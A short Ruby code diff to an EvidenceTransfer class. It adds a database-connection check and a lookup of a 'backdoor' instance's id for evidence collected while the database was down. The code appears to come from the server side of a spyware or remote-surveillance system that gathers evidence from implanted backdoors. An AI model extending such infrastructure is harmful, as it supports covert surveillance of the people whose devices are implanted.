@@ -55,6 +55,9 @@ class EvidenceTransfer
       # pass the control to other threads
       sleep 1
 
+      # don't try to transfer if the db is down
+      next unless DB.connected?
+
       # keep an eye on race conditions...
       # copy the value and don't keep the resource locked too long
       instances = @semaphore.synchronize { @evidences.each_key.to_a }
@@ -75,6 +78,14 @@ class EvidenceTransfer
               # and passing them as they were a session
               sess = info.symbolize
 
+              # if the session bid is zero, it means that we have collected the evidence
+              # when the DB was DOWN. we have to ask again to the db the real bid of the instance
+              if sess[:bid] == 0 then
+                # ask the database the bid of the backdoor
+                status, bid = DB.backdoor_status(sess[:build], sess[:instance], sess[:subtype])
+                sess[:bid] = bid
+              end
+              
               # update the status in the db
               DB.sync_start sess, info['version'], info['user'], info['device'], info['source'], info['sync_time']
 
